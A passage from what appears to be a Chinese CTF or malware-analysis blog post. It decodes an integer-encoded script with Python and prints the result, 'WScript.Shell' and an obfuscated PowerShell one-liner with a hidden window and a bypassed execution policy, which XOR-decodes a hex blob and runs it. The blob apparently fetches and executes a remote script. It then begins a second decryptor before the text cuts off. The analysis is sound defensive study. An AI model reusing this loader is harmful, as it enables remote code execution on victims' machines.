class="number">652</span>,</span><br><span class="line">        <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">658</span>,</span><br><span class="line">        <span class="number">699</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>,</span><br><span class="line">        <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>,</span><br><span class="line">        <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">649</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>,</span><br><span class="line">        <span class="number">702</span>, <span class="number">650</span>, <span class="number">657</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">658</span>, <span class="number">656</span>, <span class="number">703</span>, <span class="number">702</span>, <span class="number">658</span>, <span class="number">650</span>,</span><br><span class="line">        <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>,</span><br><span class="line">        <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>,</span><br><span class="line">        <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>,</span><br><span class="line">        <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">701</span>,</span><br><span class="line">        <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">703</span>,</span><br><span class="line">        <span class="number">699</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>,</span><br><span class="line">        <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">650</span>,</span><br><span class="line">        <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">649</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">657</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>,</span><br><span class="line">        <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">649</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">656</span>,</span><br><span class="line">        <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">658</span>, <span class="number">652</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>,</span><br><span class="line">        <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">656</span>,</span><br><span class="line">        <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">650</span>, <span class="number">702</span>, <span class="number">654</span>,</span><br><span class="line">        <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>,</span><br><span class="line">        <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">649</span>,</span><br><span class="line">        <span class="number">703</span>, <span class="number">701</span>, <span class="number">702</span>, <span class="number">649</span>, <span class="number">703</span>, <span class="number">701</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">649</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>,</span><br><span class="line">        <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">655</span>, <span class="number">702</span>, <span class="number">652</span>, <span class="number">658</span>, <span class="number">655</span>, <span class="number">703</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">657</span>,</span><br><span class="line">        <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">703</span>, <span class="number">656</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">658</span>, <span class="number">698</span>,</span><br><span class="line">        <span class="number">702</span>, <span class="number">700</span>, <span class="number">657</span>, <span class="number">701</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>,</span><br><span class="line">        <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">657</span>,</span><br><span class="line">        <span class="number">657</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">652</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">699</span>, <span class="number">649</span>,</span><br><span class="line">        <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">657</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">702</span>, <span class="number">654</span>,</span><br><span class="line">        <span class="number">699</span>, <span class="number">649</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">656</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">700</span>,</span><br><span class="line">        <span class="number">658</span>, <span class="number">652</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>,</span><br><span class="line">        <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">699</span>, <span class="number">699</span>,</span><br><span class="line">        <span class="number">698</span>, <span class="number">651</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">698</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">650</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>,</span><br><span class="line">        <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">703</span>, <span class="number">656</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">658</span>, <span class="number">656</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>,</span><br><span class="line">        <span class="number">699</span>, <span class="number">700</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">658</span>, <span class="number">650</span>, <span class="number">703</span>, <span class="number">655</span>, <span class="number">703</span>, <span class="number">655</span>, <span class="number">657</span>, <span class="number">703</span>,</span><br><span class="line">        <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>,</span><br><span class="line">        <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">657</span>,</span><br><span class="line">        <span class="number">657</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">652</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>,</span><br><span class="line">        <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>,</span><br><span class="line">        <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">657</span>, <span class="number">701</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>,</span><br><span class="line">        <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>,</span><br><span class="line">        <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">702</span>, <span class="number">700</span>,</span><br><span class="line">        <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">702</span>, <span class="number">703</span>, <span class="number">656</span>, <span class="number">640</span>, <span class="number">645</span>,</span><br><span class="line">        <span class="number">640</span>, <span class="number">647</span>, <span class="number">724</span>, <span class="number">651</span>, <span class="number">726</span>, <span class="number">640</span>, <span class="number">642</span>, <span class="number">633</span>, <span class="number">725</span>, <span class="number">633</span>, <span class="number">638</span>, <span class="number">633</span>, <span class="number">724</span>, <span class="number">633</span>, <span class="number">692</span>, <span class="number">700</span>, <span class="number">705</span>, <span class="number">698</span>, <span class="number">715</span>, <span class="number">694</span>, <span class="number">641</span>, <span class="number">692</span>,</span><br><span class="line">        <span class="number">668</span>, <span class="number">712</span>, <span class="number">711</span>, <span class="number">719</span>, <span class="number">702</span>, <span class="number">715</span>, <span class="number">717</span>, <span class="number">694</span>, <span class="number">659</span>, <span class="number">659</span>, <span class="number">685</span>, <span class="number">712</span>, <span class="number">667</span>, <span class="number">722</span>, <span class="number">717</span>, <span class="number">702</span>, <span class="number">641</span>, <span class="number">637</span>, <span class="number">696</span>, <span class="number">647</span>, <span class="number">687</span>, <span class="number">698</span>,</span><br><span class="line">        <span class="number">709</span>, <span class="number">718</span>, <span class="number">702</span>, <span class="number">645</span>, <span class="number">650</span>, <span class="number">655</span>, <span class="number">642</span>, <span class="number">633</span>, <span class="number">646</span>, <span class="number">699</span>, <span class="number">721</span>, <span class="number">712</span>, <span class="number">715</span>, <span class="number">633</span>, <span class="number">640</span>, <span class="number">651</span>, <span class="number">649</span>, <span class="number">653</span>, <span class="number">640</span>, <span class="number">642</span>, <span class="number">633</span>, <span class="number">726</span>,</span><br><span class="line">        <span class="number">642</span>, <span class="number">633</span>, <span class="number">646</span>, <span class="number">707</span>, <span class="number">712</span>, <span class="number">706</span>, <span class="number">711</span>, <span class="number">633</span>, <span class="number">640</span>, <span class="number">640</span>, <span class="number">660</span>, <span class="number">639</span>, <span class="number">633</span>, <span class="number">637</span>, <span class="number">670</span>, <span class="number">671</span>, <span class="number">685</span>, <span class="number">670</span>, <span class="number">647</span>, <span class="number">684</span>, <span class="number">718</span>, <span class="number">699</span>,</span><br><span class="line">        <span class="number">716</span>, <span class="number">717</span>, <span class="number">715</span>, <span class="number">706</span>, <span class="number">711</span>, <span class="number">704</span>, <span class="number">641</span>, <span class="number">649</span>, <span class="number">645</span>, <span class="number">652</span>, <span class="number">642</span>, <span class="number">633</span>, <span class="number">637</span>, <span class="number">670</span>, <span class="number">671</span>, <span class="number">685</span>, <span class="number">670</span>, <span class="number">647</span>, <span class="number">684</span>, <span class="number">718</span>, <span class="number">699</span>, <span class="number">716</span>,</span><br><span class="line">        <span class="number">717</span>, <span class="number">715</span>, <span class="number">706</span>, <span class="number">711</span>, <span class="number">704</span>, <span class="number">641</span>, <span class="number">652</span>, <span class="number">642</span>]</span><br><span class="line">str1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc1)):</span><br><span class="line">    str1 += <span class="built_in">chr</span>(enc1[i] - <span class="number">601</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc2)):</span><br><span class="line">    str2+=<span class="built_in">chr</span>(enc2[j]-<span class="number">601</span>)</span><br><span class="line"><span class="built_in">print</span>(str1)</span><br><span class="line"><span class="built_in">print</span>(str2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>出来的是</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WScript.Shell</span><br><span class="line">powershell.exe <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-ep</span> Unrestricted <span class="literal">-nop</span> <span class="variable">$EFTE</span> =([<span class="type">regex</span>]::Matches(<span class="string">&#x27;a5a9b49fb8adbeb8e19cbea3afa9bfbfeceee8a9a2baf69fb5bfb8a9a19ea3a3b8909fb5bf9b839bfaf8909ba5a2a8a3bbbf9ca3bba9be9fa4a9a0a090bafde2fc90bca3bba9bebfa4a9a0a0e2a9b4a9eeece19ba5a2a8a3bb9fb8b5a0a9ec84a5a8a8a9a2ece18dbeabb9a1a9a2b880a5bfb8ecebe1bbebe0eba4ebe0ebe1a9bcebe0eb99a2bea9bfb8bea5afb8a9a8ebe0ebe18fa3a1a1ada2a8ebe0ee9fa9b8e19aadbea5adaea0a9ecffeceba4b8b8bcf6e3e3afa4ada0a0a9a2aba9e2b4a5a2bfa4a5e2aab9a2f6f8faf4f5f9e3aea9bfb8b9a8a8a5a2abe2a6bcabebf79f85ec9aadbea5adaea0a9f6e396f888eceb82a9b8e29ba9ae8fa0a5a9a2b8ebf7afa8f79f9aecaff884ece4e2ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9bee597fe91e282ada1a9e5e285a2baa3a7a9e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9beb09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6a882ada1a9ebb1e5e282ada1a9e5e285a2baa3a7a9e4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f888e5e29aada0b9a9e5f79f9aec8dece4e4e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5b08ba9b8e181a9a1aea9bee5b09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6bba2e6a8e6abebb1e5e282ada1a9e5f7eae4979fafbea5bcb88ea0a3afa791f6f68fbea9adb8a9e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5e2e4e48ba9b8e19aadbea5adaea0a9ec8de5e29aada0b9a9e5e285a2baa3a7a9e4e49aadbea5adaea0a9ecffece19aada0e5e5e5e5eef7&#x27;</span>,<span class="string">&#x27;.&#123;2&#125;&#x27;</span>) | % &#123; [<span class="built_in">char</span>]([<span class="type">Convert</span>]::ToByte(<span class="variable">$_</span>.Value,<span class="number">16</span>) <span class="operator">-bxor</span> <span class="string">&#x27;204&#x27;</span>) &#125;) <span class="operator">-join</span> <span class="string">&#x27;&#x27;</span>;&amp; <span class="variable">$EFTE</span>.Substring(<span class="number">0</span>,<span class="number">3</span>) <span class="variable">$EFTE</span>.Substring(<span class="number">3</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还是看不懂🫠</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_powershell_script</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="comment"># 每2个字符分割</span></span><br><span class="line">    hex_pairs = re.findall(<span class="string">&#x27;.&#123;2&#125;&#x27;</span>, hex_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转换为字节并异或解密</span></span><br><span class="line">    decrypted_bytes = []</span><br><span class="line">    <span class="keyword">for</span> pair <span class="keyword">in</span> hex_pairs:</span><br><span class="line">        byte = <span class="built_in">int</span>(pair, <span class="number">16</span>)</span><br><span class="line">        decrypted_byte = byte ^ <span class="number">0xcc</span> <span class="comment"># XOR操作</span></span><br><span class="line">        decrypted_bytes.append(decrypted_byte)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转换为ASCII字符</span></span><br><span class="line">    decrypted_chars = [<span class="built_in">chr</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> decrypted_bytes]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拼接成完整字符串</span></span><br><span class="line">    decrypted_script = <span class="string">&#x27;&#x27;</span>.join(decrypted_chars)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted_script</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例使用（替换为实际的长字符串）</span></span><br><span class="line">hex_string = <span 